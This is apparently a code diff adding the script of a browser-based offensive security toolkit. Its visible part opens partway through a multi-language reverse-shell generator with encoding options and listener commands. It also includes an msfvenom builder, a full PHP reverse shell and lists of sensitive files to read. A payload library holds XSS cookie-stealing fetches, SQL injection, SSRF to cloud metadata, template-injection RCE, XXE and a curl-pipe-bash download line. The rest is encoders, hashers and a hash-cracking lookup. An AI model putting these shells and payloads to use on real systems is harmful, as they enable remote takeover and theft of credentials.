+  psb64:(h,p)=>{const cmd=`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb3,0,$sb3.Length);$stream.Flush()};$client.Close()"`;return `powershell -EncodedCommand ${btoa(unescape(encodeURIComponent(cmd)))}`; },
+  perl:(h,p)=>`perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+  ruby:(h,p)=>`ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+  php:(h,p)=>`php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+  phpproc:(h,p)=>`php -r '$sock=fsockopen("${h}",${p});$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
+  lua:(h,p)=>`lua -e "require('socket');require('os');t=socket.tcp();t:connect('${h}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
+  golang:(h,p)=>`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${h}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
+  awk:(h,p)=>`awk 'BEGIN{s="/inet/tcp/0/${h}/${p}";while(42){do{printf "$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!="exit")close(s)}}' /dev/null`,
+  java:(h,p)=>`r=Runtime.getRuntime();p=r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5|while read line;do $line 2>&5 >&5;done"});p.waitFor();`,
+  socat:(h,p)=>`socat TCP:${h}:${p} EXEC:/bin/bash`,
+  'socat-tty':(h,p)=>`socat TCP:${h}:${p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
+  nodejs:(h,p)=>`node -e "(function(){var n=require('net'),s=new n.Socket(),p=require('child_process');s.connect(${p},'${h}',function(){var sh=p.spawn('/bin/sh',[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);});})()"`,
+};
+let activeEncs=[];
+function toggleEnc(el){
+  const e=el.dataset.e;
+  const i=activeEncs.indexOf(e);
+  if(i>-1){activeEncs.splice(i,1);el.classList.remove('on');}
+  else{activeEncs.push(e);el.classList.add('on');}
+  genShell();
+}
+function applyEncodings(s){
+  for(const e of activeEncs){
+    if(e==='b64') s=btoa(unescape(encodeURIComponent(s)));
+    else if(e==='url') s=encodeURIComponent(s);
+    else if(e==='durl') s=encodeURIComponent(encodeURIComponent(s));
+    else if(e==='hex') s=Array.from(s).map(c=>'%'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+    else if(e==='unicode') s=Array.from(s).map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
+    else if(e==='html') s=s.replace(/./g,c=>`&#${c.charCodeAt(0)};`);
+  }
+  return s;
+}
+function genShell(){
+  const t=document.getElementById('shell-type').value;
+  const h=document.getElementById('lhost').value||'192.168.49.57';
+  const p=document.getElementById('lport').value||'54';
+  const fn=SHELLS[t];
+  if(!fn)return;
+  const raw=fn(h,p);
+  const out=applyEncodings(raw);
+  document.getElementById('shell-out').textContent=out;
+  document.getElementById('shell-lang-lbl').textContent=t;
+  // listener
+  const lc=document.getElementById('listener-cmds');
+  lc.innerHTML=`
+    <div class="cmd-item"><div class="cmd-lbl">netcat listener</div><div class="cmd-val">nc -lnvp ${p}</div></div>
+    <div class="cmd-item"><div class="cmd-lbl">rlwrap (better TTY)</div><div class="cmd-val">rlwrap nc -lnvp ${p}</div></div>
+    <div class="cmd-item"><div class="cmd-lbl">pwncat-cs</div><div class="cmd-val">pwncat-cs -lp ${p}</div></div>
+    <div class="cmd-item"><div class="cmd-lbl">socat listener (full tty)</div><div class="cmd-val">socat file:\`tty\`,raw,echo=0 tcp-listen:${p}</div></div>
+    <div class="cmd-item"><div class="cmd-lbl">metasploit handler</div><div class="cmd-val">use exploit/multi/handler; set LHOST ${h}; set LPORT ${p}; run</div></div>`;
+}
+function copyShell(){
+  const t=document.getElementById('shell-out').textContent;
+  copyText(t);
+}
+
+// ─── MSF BUILDER ───
+function genMsf(){
+  const pl=document.getElementById('msf-payload').value;
+  const lh=document.getElementById('msf-lhost').value||'10.10.13.37';
+  const lp=document.getElementById('msf-lport').value||'4444';
+  const enc=document.getElementById('msf-encoder').value;
+  const it=document.getElementById('msf-iter').value||'1';
+  const bad=document.getElementById('msf-bad').value;
+  const fmt=document.getElementById('msf-format').value;
+  const of=document.getElementById('msf-out-file').value||'payload.'+fmt;
+  let cmd=`msfvenom -p ${pl} LHOST=${lh} LPORT=${lp}`;
+  if(enc) cmd+=` -e ${enc} -i ${it}`;
+  if(bad) cmd+=` -b '${bad}'`;
+  cmd+=` -f ${fmt} -o ${of}`;
+  document.getElementById('msf-cmd-out').textContent=cmd;
+  document.getElementById('msf-launch-out').textContent=`msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${pl}; set LHOST ${lh}; set LPORT ${lp}; run"`;
+  document.getElementById('msf-handler-out').textContent=`use exploit/multi/handler\nset PAYLOAD ${pl}\nset LHOST ${lh}\nset LPORT ${lp}\nrun`;
+}
+function msfTab(el,id){
+  document.querySelectorAll('.mt').forEach(x=>x.classList.remove('on'));
+  el.classList.add('on');
+  ['msf-cmd','msf-launch','msf-handler'].forEach(x=>{
+    document.getElementById(x).style.display=x===id?'block':'none';
+  });
+}
+
+// ─── PHP SHELL ───
+function genPhpShell(){
+  const ip=document.getElementById('php-ip').value||'192.168.49.57';
+  const port=document.getElementById('php-port').value||'54';
+  document.getElementById('php-full-out').textContent=`<?php
+set_time_limit(0);
+$ip = '${ip}';
+$port = ${port};
+$chunk_size = 1400;
+$write_a = null; $error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0; $debug = 0;
+
+if (function_exists('pcntl_fork')) {
+  $pid = pcntl_fork();
+  if ($pid == -1) { printit("ERROR: Can't fork"); exit(1); }
+  if ($pid) { exit(0); }
+  if (posix_setsid() == -1) { printit("Error: Can't setsid()"); exit(1); }
+  $daemon = 1;
+} else {
+  printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
+}
+
+chdir("/"); umask(0);
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) { printit("$errstr ($errno)"); exit(1); }
+
+$descriptorspec = array(
+  0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w")
+);
+$process = proc_open($shell, $descriptorspec, $pipes);
+if (!is_resource($process)) { printit("ERROR: Can't spawn shell"); exit(1); }
+
+stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0);
+
+while (1) {
+  if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; }
+  if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; }
+  $read_a = array($sock, $pipes[1], $pipes[2]);
+  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+  if (in_array($sock, $read_a)) {
+    $input = fread($sock, $chunk_size);
+    fwrite($pipes[0], $input);
+  }
+  if (in_array($pipes[1], $read_a)) {
+    $input = fread($pipes[1], $chunk_size);
+    fwrite($sock, $input);
+  }
+  if (in_array($pipes[2], $read_a)) {
+    $input = fread($pipes[2], $chunk_size);
+    fwrite($sock, $input);
+  }
+}
+fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+proc_close($process);
+function printit($string) { if (!$daemon) { print "$string\\n"; } }
+?>`;
+}
+
+// ─── LFI LISTS ───
+function buildLfiLists(){
+  const linux=['/etc/passwd','/etc/shadow','/etc/issue','/etc/group','/etc/hostname','/etc/ssh/ssh_config','/etc/ssh/sshd_config','/root/.ssh/id_rsa','/root/.ssh/authorized_keys','/home/user/.ssh/authorized_keys','/proc/mounts','/proc/self/environ','/home/$USER/.bash_history','/var/run/secrets/kubernetes.io/serviceaccount','/var/lib/mlocate/mlocate.db'];
+  const win=['/boot.ini','/autoexec.bat','/windows/system32/drivers/etc/hosts','/windows/repair/SAM','/windows/panther/unattended.xml','/windows/panther/unattend/unattended.xml','/windows/system32/license.rtf','/windows/system32/eula.txt'];
+  const apache=['/etc/apache2/apache2.conf','/usr/local/etc/apache2/httpd.conf','/etc/httpd/conf/httpd.conf','/var/log/apache2/access.log','/var/log/apache/error.log','/var/lib/mysql/mysql/user.frm','/var/lib/mysql/mysql/user.MYD','/var/lib/mysql/mysql/user.MYI'];
+  const ll=document.getElementById('lfi-linux-list');
+  const wl=document.getElementById('lfi-win-list');
+  const al=document.getElementById('lfi-apache-list');
+  if(ll) ll.innerHTML=linux.map(f=>`<div class="cmd-item"><div class="cmd-val">${f}</div></div>`).join('');
+  if(wl) wl.innerHTML=win.map(f=>`<div class="cmd-item"><div class="cmd-val">${f}</div></div>`).join('');
+  if(al) al.innerHTML=apache.map(f=>`<div class="cmd-item"><div class="cmd-val">${f}</div></div>`).join('');
+}
+
+// ─── PAYLOADS ───
+const DEFAULT_PAYLOADS=[
+  {title:'Basic XSS alert',cat:'xss',tags:['web'],code:`<script>alert(document.domain)<\/script>`,desc:'Basic reflected XSS PoC'},
+  {title:'XSS cookie stealer (fetch)',cat:'xss',tags:['web','oob'],code:`<script>fetch('https://COLLAB/?c='+btoa(document.cookie))<\/script>`,desc:'Exfil cookies via fetch'},
+  {title:'XSS img onerror',cat:'xss',tags:['web','blind'],code:`<img src=x onerror="this.src='https://COLLAB/?x='+document.cookie">`,desc:'Fires on broken image load'},
+  {title:'SQLi UNION null probe',cat:'sqli',tags:['web'],code:`' UNION SELECT NULL,NULL,NULL-- -`,desc:'Probe for column count'},
+  {title:'SQLi time-based MSSQL',cat:'sqli',tags:['web','blind'],code:`'; WAITFOR DELAY '0:0:5'--`,desc:'MSSQL blind time-based'},
+  {title:'SQLi error-based MySQL',cat:'sqli',tags:['web'],code:`' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,desc:'Extract version via error'},
+  {title:'SSRF AWS metadata',cat:'ssrf',tags:['web','oob'],code:`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,desc:'AWS IMDSv1 endpoint'},
+  {title:'SSRF via DNS rebind',cat:'ssrf',tags:['web','blind'],code:`http://COLLAB.rebind.it/internal`,desc:'DNS rebind SSRF bypass'},
+  {title:'SSTI Jinja2 RCE',cat:'ssti',tags:['web','linux'],code:`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,desc:'Flask/Jinja2 template RCE'},
+  {title:'SSTI Twig RCE',cat:'ssti',tags:['web'],code:`{{["id"]|map("system")|join}}`,desc:'Twig v1 RCE'},
+  {title:'LFI path traversal',cat:'lfi',tags:['web','linux'],code:`../../../../../../../../etc/passwd`,desc:'Classic path traversal'},
+  {title:'LFI null byte bypass',cat:'lfi',tags:['web','linux'],code:`../../../../etc/passwd%00`,desc:'Null byte extension strip'},
+  {title:'RCE curl pipe bash',cat:'rce',tags:['linux'],code:`curl -s http://LHOST/shell.sh | bash`,desc:'Pull and exec remote script'},
+  {title:'XXE basic file read',cat:'xxe',tags:['web','linux'],code:`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,desc:'Read /etc/passwd via XXE'},
+  {title:'XXE OOB DTD exfil',cat:'xxe',tags:['web','oob'],code:`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLAB/evil.dtd"> %xxe;]><foo>test</foo>`,desc:'Blind XXE via out-of-band DTD'},
+  {title:'Open redirect',cat:'ssrf',tags:['web'],code:`/redirect?url=https://evil.com`,desc:'Basic open redirect'},
+  {title:'CORS misconfiguration',cat:'xss',tags:['web'],code:`fetch('https://target.com/api/data',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://COLLAB/?d='+btoa(d)))`,desc:'CORS data exfil'},
+];
+let PAYLOADS=[...DEFAULT_PAYLOADS];
+const TAG_CLASS={web:'pt-web',win:'pt-win',linux:'pt-lin',blind:'pt-blind',oob:'pt-oob'};
+let payloadFilter='all';
+function renderPayloads(){
+  const search=(document.getElementById('payload-search')?.value||'').toLowerCase();
+  const cats=[...new Set(PAYLOADS.map(p=>p.cat))];
+  const fr=document.getElementById('payload-filters');
+  if(fr&&!fr.dataset.built){
+    fr.dataset.built='1';
+    fr.innerHTML=['all',...cats].map(c=>`<button class="fc${c==='all'?' on':''}" data-c="${c}" onclick="setPayloadFilter(this)">${c}</button>`).join('');
+  }
+  const filtered=PAYLOADS.filter(p=>(payloadFilter==='all'||p.cat===payloadFilter)&&(!search||p.title.toLowerCase().includes(search)||p.code.toLowerCase().includes(search)));
+  document.getElementById('payload-grid').innerHTML=filtered.map((p,i)=>`
+    <div class="p-card">
+      <div class="p-top">
+        <span class="p-name">${p.title}</span>
+        <div class="p-tags">${p.tags.map(t=>`<span class="pt ${TAG_CLASS[t]||'pt-web'}">${t}</span>`).join('')}</div>
+      </div>
+      <div class="p-code">${p.code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
+      <div class="p-foot">
+        <span class="p-desc">${p.desc}</span>
+        <button class="btn" style="padding:3px 9px;font-size:10px;" onclick="copyText(${JSON.stringify(p.code)},this)">copy</button>
+      </div>
+    </div>`).join('');
+}
+function setPayloadFilter(el){
+  payloadFilter=el.dataset.c;
+  document.querySelectorAll('#payload-filters .fc').forEach(x=>x.classList.toggle('on',x===el));
+  renderPayloads();
+}
+
+// ─── ENCODING / DECODING ───
+const MORSE={'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.',' ':'/'};
+const MORSE_REV=Object.fromEntries(Object.entries(MORSE).map(([k,v])=>[v,k]));
+function doEnc(op){
+  const inp=document.getElementById('enc-input').value;
+  let out='';
+  try{
+    if(op==='b64e') out=btoa(unescape(encodeURIComponent(inp)));
+    else if(op==='b64d') out=decodeURIComponent(escape(atob(inp)));
+    else if(op==='urle') out=encodeURIComponent(inp);
+    else if(op==='urld') out=decodeURIComponent(inp);
+    else if(op==='durle') out=encodeURIComponent(encodeURIComponent(inp));
+    else if(op==='durld') out=decodeURIComponent(decodeURIComponent(inp));
+    else if(op==='htmle') out=inp.replace(/./gs,c=>`&#${c.charCodeAt(0)};`);
+    else if(op==='htmld'){const d=document.createElement('div');d.innerHTML=inp;out=d.textContent;}
+    else if(op==='hexe') out=Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
+    else if(op==='hexd') out=inp.split(/\s+/).map(h=>String.fromCharCode(parseInt(h,16))).join('');
+    else if(op==='bine') out=Array.from(inp).map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');
+    else if(op==='bind') out=inp.split(/\s+/).map(b=>String.fromCharCode(parseInt(b,2))).join('');
+    else if(op==='octe') out=Array.from(inp).map(c=>c.charCodeAt(0).toString(8).padStart(3,'0')).join(' ');
+    else if(op==='octd') out=inp.split(/\s+/).map(o=>String.fromCharCode(parseInt(o,8))).join('');
+    else if(op==='rot13') out=inp.replace(/[a-zA-Z]/g,c=>{const b=c<='\x5A'?65:97;return String.fromCharCode(((c.charCodeAt(0)-b+13)%26)+b);});
+    else if(op==='rot47') out=inp.replace(/[!-~]/g,c=>String.fromCharCode(((c.charCodeAt(0)-33+47)%94)+33));
+    else if(op==='rev') out=inp.split('').reverse().join('');
+    else if(op==='unib64') out=btoa(String.fromCharCode(...new TextEncoder().encode(inp)));
+    else if(op==='jsesc') out=Array.from(inp).map(c=>c.charCodeAt(0)>127||c==='"'||c==="'"?'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0'):c).join('');
+    else if(op==='jsuesc') out=inp.replace(/\\u([0-9a-fA-F]{4})/g,(_,h)=>String.fromCharCode(parseInt(h,16)));
+    else if(op==='morse') out=inp.toUpperCase().split('').map(c=>MORSE[c]||'?').join(' ');
+    else if(op==='morse_d') out=inp.split(' ').map(c=>MORSE_REV[c]||'?').join('');
+    else if(op==='b32e'){
+      const B32='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+      const bytes=new TextEncoder().encode(inp);
+      let bits=0,val=0,r='';
+      for(const b of bytes){val=(val<<8)|b;bits+=8;while(bits>=5){r+=B32[(val>>>(bits-5))&31];bits-=5;}}
+      if(bits>0){r+=B32[(val<<(5-bits))&31];}
+      while(r.length%8)r+='=';
+      out=r;
+    }
+    else if(op==='b32d'){
+      const B32='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+      const s=inp.replace(/=/g,'').toUpperCase();
+      let bits=0,val=0;const bs=[];
+      for(const c of s){val=(val<<5)|B32.indexOf(c);bits+=5;if(bits>=8){bs.push((val>>>(bits-8))&255);bits-=8;}}
+      out=new TextDecoder().decode(new Uint8Array(bs));
+    }
+    else if(op==='atob_e') out=Array.from(inp).map(c=>c.charCodeAt(0)).join(' ');
+    else if(op==='atob_d') out=inp.split(/\s+/).map(n=>String.fromCharCode(parseInt(n))).join('');
+    else if(op==='ip_hex'){
+      const p=inp.trim().split('.');
+      if(p.length===4) out='0x'+p.map(n=>parseInt(n).toString(16).padStart(2,'0')).join('');
+      else out='invalid IP';
+    }
+    else if(op==='ip_dec'){
+      const p=inp.trim().split('.');
+      if(p.length===4) out=p.reduce((a,b)=>(a<<8)|parseInt(b),0)>>>0;
+      else out='invalid IP';
+    }
+    else if(op==='ip_oct'){
+      const p=inp.trim().split('.');
+      if(p.length===4) out=p.map(n=>'0'+parseInt(n).toString(8)).join('.');
+      else out='invalid IP';
+    }
+  }catch(e){out='error: '+e.message;}
+  document.getElementById('enc-output').value=out;
+}
+function swapEncIO(){
+  const a=document.getElementById('enc-input').value;
+  document.getElementById('enc-input').value=document.getElementById('enc-output').value;
+  document.getElementById('enc-output').value=a;
+}
+
+// ─── HASH GENERATOR ───
+async function sha256(s){const e=new TextEncoder();const d=await crypto.subtle.digest('SHA-256',e.encode(s));return Array.from(new Uint8Array(d)).map(x=>x.toString(16).padStart(2,'0')).join('');}
+async function sha1(s){const e=new TextEncoder();const d=await crypto.subtle.digest('SHA-1',e.encode(s));return Array.from(new Uint8Array(d)).map(x=>x.toString(16).padStart(2,'0')).join('');}
+async function sha512(s){const e=new TextEncoder();const d=await crypto.subtle.digest('SHA-512',e.encode(s));return Array.from(new Uint8Array(d)).map(x=>x.toString(16).padStart(2,'0')).join('');}
+async function sha384(s){const e=new TextEncoder();const d=await crypto.subtle.digest('SHA-384',e.encode(s));return Array.from(new Uint8Array(d)).map(x=>x.toString(16).padStart(2,'0')).join('');}
+function md5(s){function safeAdd(x,y){const l=(x&0xffff)+(y&0xffff);const m=(x>>16)+(y>>16)+(l>>16);return(m<<16)|(l&0xffff);}function bitRotateLeft(n,c){return(n<<c)|(n>>>(32-c));}function md5cmn(q,a,b,x,s,t){return safeAdd(bitRotateLeft(safeAdd(safeAdd(a,q),safeAdd(x,t)),s),b);}function md5ff(a,b,c,d,x,s,t){return md5cmn((b&c)|((~b)&d),a,b,x,s,t);}function md5gg(a,b,c,d,x,s,t){return md5cmn((b&d)|(c&(~d)),a,b,x,s,t);}function md5hh(a,b,c,d,x,s,t){return md5cmn(b^c^d,a,b,x,s,t);}function md5ii(a,b,c,d,x,s,t){return md5cmn(c^(b|(~d)),a,b,x,s,t);}function utf8Encode(str){return unescape(encodeURIComponent(str));}function convertToWordArray(str){const we=utf8Encode(str);const wc=we.length;const wa=[];for(let i=0;i<wc;i++){wa[i>>2]|=we.charCodeAt(i)<<((i%4)*8);}return{wa,wc};}const{wa,wc}=convertToWordArray(s);wa[wc>>2]|=0x80<<((wc%4)*8);wa[(((wc+8)>>6)<<4)+14]=wc*8;let a=1732584193,b=-271733879,c=-1732584194,d=271733878;for(let i=0;i<wa.length;i+=16){const [A,B,C,D]=[a,b,c,d];a=md5ff(a,b,c,d,wa[i+0],7,-680876936);d=md5ff(d,a,b,c,wa[i+1],12,-389564586);c=md5ff(c,d,a,b,wa[i+2],17,606105819);b=md5ff(b,c,d,a,wa[i+3],22,-1044525330);a=md5ff(a,b,c,d,wa[i+4],7,-176418897);d=md5ff(d,a,b,c,wa[i+5],12,1200080426);c=md5ff(c,d,a,b,wa[i+6],17,-1473231341);b=md5ff(b,c,d,a,wa[i+7],22,-45705983);a=md5ff(a,b,c,d,wa[i+8],7,1770035416);d=md5ff(d,a,b,c,wa[i+9],12,-1958414417);c=md5ff(c,d,a,b,wa[i+10],17,-42063);b=md5ff(b,c,d,a,wa[i+11],22,-1990404162);a=md5ff(a,b,c,d,wa[i+12],7,1804603682);d=md5ff(d,a,b,c,wa[i+13],12,-40341101);c=md5ff(c,d,a,b,wa[i+14],17,-1502002290);b=md5ff(b,c,d,a,wa[i+15],22,1236535329);a=md5gg(a,b,c,d,wa[i+1],5,-165796510);d=md5gg(d,a,b,c,wa[i+6],9,-1069501632);c=md5gg(c,d,a,b,wa[i+11],14,643717713);b=md5gg(b,c,d,a,wa[i+0],20,-373897302);a=md5gg(a,b,c,d,wa[i+5],5,-701558691);d=md5gg(d,a,b,c,wa[i+10],9,38016083);c=md5gg(c,d,a,b,wa[i+15],14,-660478335);b=md5gg(b,c,d,a,wa[i+4],20,-405537848);a=md5gg(a,b,c,d,wa[i+9],5,568446438);d=md5gg(d,a,b,c,wa[i+14],9,-1019803690);c=md5gg(c,d,a,b,wa[i+3],14,-187363961);b=md5gg(b,c,d,a,wa[i+8],20,1163531501);a=md5gg(a,b,c,d,wa[i+13],5,-1444681467);d=md5gg(d,a,b,c,wa[i+2],9,-51403784);c=md5gg(c,d,a,b,wa[i+7],14,1735328473);b=md5gg(b,c,d,a,wa[i+12],20,-1926607734);a=md5hh(a,b,c,d,wa[i+5],4,-378558);d=md5hh(d,a,b,c,wa[i+8],11,-2022574463);c=md5hh(c,d,a,b,wa[i+11],16,1839030562);b=md5hh(b,c,d,a,wa[i+14],23,-35309556);a=md5hh(a,b,c,d,wa[i+1],4,-1530992060);d=md5hh(d,a,b,c,wa[i+4],11,1272893353);c=md5hh(c,d,a,b,wa[i+7],16,-155497632);b=md5hh(b,c,d,a,wa[i+10],23,-1094730640);a=md5hh(a,b,c,d,wa[i+13],4,681279174);d=md5hh(d,a,b,c,wa[i+0],11,-358537222);c=md5hh(c,d,a,b,wa[i+3],16,-722521979);b=md5hh(b,c,d,a,wa[i+6],23,76029189);a=md5hh(a,b,c,d,wa[i+9],4,-640364487);d=md5hh(d,a,b,c,wa[i+12],11,-421815835);c=md5hh(c,d,a,b,wa[i+15],16,530742520);b=md5hh(b,c,d,a,wa[i+2],23,-995338651);a=md5ii(a,b,c,d,wa[i+0],6,-198630844);d=md5ii(d,a,b,c,wa[i+7],10,1126891415);c=md5ii(c,d,a,b,wa[i+14],15,-1416354905);b=md5ii(b,c,d,a,wa[i+5],21,-57434055);a=md5ii(a,b,c,d,wa[i+12],6,1700485571);d=md5ii(d,a,b,c,wa[i+3],10,-1894986606);c=md5ii(c,d,a,b,wa[i+10],15,-1051523);b=md5ii(b,c,d,a,wa[i+1],21,-2054922799);a=md5ii(a,b,c,d,wa[i+8],6,1873313359);d=md5ii(d,a,b,c,wa[i+15],10,-30611744);c=md5ii(c,d,a,b,wa[i+6],15,-1560198380);b=md5ii(b,c,d,a,wa[i+13],21,1309151649);a=md5ii(a,b,c,d,wa[i+4],6,-145523070);d=md5ii(d,a,b,c,wa[i+11],10,-1120210379);c=md5ii(c,d,a,b,wa[i+2],15,718787259);b=md5ii(b,c,d,a,wa[i+9],21,-343485551);a=safeAdd(a,A);b=safeAdd(b,B);c=safeAdd(c,C);d=safeAdd(d,D);}return[a,b,c,d].map(v=>{let r='';for(let i=0;i<4;i++){r+=('0'+((v>>(i*8))&0xff).toString(16)).slice(-2);}return r;}).join('');}
+async function generateHashes(){
+  const inp=document.getElementById('hash-gen-input').value;
+  if(!inp) return;
+  const m=md5(inp);
+  const s1=await sha1(inp);
+  const s256=await sha256(inp);
+  const s384=await sha384(inp);
+  const s512=await sha512(inp);
+  const ntlm_hash=Array.from(new TextEncoder().encode([...inp].map(c=>c+'\0').join(''))).reduce((a,b,i)=>{if(i%2===0)a.push(0);a[a.length-1]|=b<<((i%2)*8);return a;},[]);
+  document.getElementById('hash-gen-results').innerHTML=[
+    {lbl:'MD5',val:m},{lbl:'SHA1',val:s1},{lbl:'SHA256',val:s256},{lbl:'SHA384',val:s384},{lbl:'SHA512',val:s512},
+    {lbl:'Base64',val:btoa(unescape(encodeURIComponent(inp)))},
+    {lbl:'Hex',val:Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('')},
+  ].map(h=>`<div class="cmd-item" style="display:grid;grid-template-columns:80px 1fr auto;gap:8px;align-items:center;">
+    <div class="cmd-lbl">${h.lbl}</div>
+    <div class="cmd-val" style="word-break:break-all;">${h.val}</div>
+    <button class="btn" style="padding:3px 9px;font-size:10px;flex-shrink:0;" onclick="copyText('${h.val}',this)">copy</button>
+  </div>`).join('');
+}
+
+// ─── HASH CRACKER ───
+function saveApiKey(){
+  const k=document.getElementById('hashes-api-key').value;
+  localStorage.setItem('hashescom_key',k);
+  const btn=event.target;btn.textContent='saved!';setTimeout(()=>btn.textContent='save',1500);
+}
+function loadApiKey(){
+  const k=localStorage.getItem('hashescom_key');
+  if(k) document.getElementById('hashes-api-key').value=k;
+}
+async function crackSingle(){
+  const hash=document.getElementById('crack-hash-input').value.trim();
+  const key=localStorage.getItem('hashescom_key')||'';
+  const ld=document.getElementById('crack-loading-single');
+  const rd=document.getElementById('crack-single-result');
+  if(!hash){rd.innerHTML='<div style="font-size:11px;color:var(--muted);">enter a hash first</div>';return;}
+  ld.classList.add('show');rd.innerHTML='';
+  try{
+    const url=`https://hashes.com/en/api/identifier?hash=${encodeURIComponent(hash)}`;
+    const res=await fetch(url,{headers:key?{'X-API-Key':key}:{}});
+    const data=await res.json();
+    ld.classList.remove('show');
+    if(data&&data.result&&data.result.plaintext){
+      rd.innerHTML=`<div class="hash-result found" style="display:block;text-align:left;padding:10px 14px;">
+        <div style="font-size:10px;color:var(--muted);margin-bottom:4px;text-transform:uppercase;letter-spacing:.06em;">plaintext found</div>
+        <div style="font-size:14px;color:var(--green);font-weight:500;">${data.result.plaintext}</div>
+        ${data.result.algorithm?`<div style="font-size:10px;color:var(--muted);margin-top:4px;">algorithm: ${data.result.algorithm}</div>`:''}
+      </div>`;
+    } else {
+      rd.innerHTML=`<div class="hash-result notfound" style="display:block;text-align:left;padding:10px 14px;">
+        <div style="font-size:10px;color:var(--red);margin-bottom:2px;text-transform:uppercase;letter-spacing:.06em;">not found</div>
+        <div style="font-size:11px;color:var(--muted);">Hash not in hashes.com database. Try a different hash type or check your API key.</div>
+      </div>`;
+    }
+  }catch(e){
+    ld.classList.remove('show');
+    rd.innerHTML=`<div style="font-size:11px;color:var(--red);">Error: ${e.message}. Check API key or CORS — may need a proxy.</div>`;
+  }
+}
+async function crackBulk(){
+  const hashes=document.getElementById('crack-bulk-input').value.trim().split('\n').map(h=>h.trim()).filter(Boolean);
+  const key=localStorage.getItem('hashescom_key')||'';
+  const ld=document.getElementById('crack-loading-bulk');
+  const rd=document.getElementById('crack-bulk-result');
+  if(!hashes.length){return;}
+  ld.classList.add('show');rd.innerHTML='';
+  try{
+    const url=`https://hashes.com/en/api/identifier`;
+    const res=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json',...(key?{'X-API-Key':key}:{})},body:JSON.stringify({hashes})});
+    const data=await res.json();
+    ld.classList.remove('show');
+    const results=Array.isArray(data.result)?data.result:[];
+    if(results.length){
+      rd.innerHTML=`<table class="hash-results-table">
+        <thead><tr><th>hash</th><th>plaintext</th><th>algorithm</th></tr></thead>
+        <tbody>${results.map(r=>`<tr>
+          <td style="color:var(--muted);max-width:200px;overflow:hidden;text-overflow:ellipsis;">${r.hash||'—'}</td>
+          <td style="color:${r.plaintext?'var(--green)':'var(--muted)'};">${r.plaintext||'not found'}</td>
+          <td style="color:var(--muted);">${r.algorithm||'—'}</td>
+        </tr>`).join('')}</tbody>
+      </table>`;
+    } else {
+      rd.innerHTML=`<div style="font-size:11px;color:var(--muted);">No results returned. Check API key.</div>`;
+    }
+  }catch(e){
+    ld.classList.remove('show');
+    rd.innerHTML=`<div style="font-size:11px;color:var(--red);">Error: ${e.message}</div>`;
+  }
+}
+
+// ─── UTILS ───
+function copyText(t,btn){
+  navigator.clipboard.writeText(t).then(()=>{
+    if(btn){const old=btn.textContent;btn.textContent='copied!';btn.classList.add('ok');setTimeout(()=>{btn.textContent=old;btn.classList.remove('ok');},1400);}
+  });
+}
+function copyById(id){
+  const el=document.getElementById(id);
+  if(!el)return;
+  const t=el.value||el.textContent;
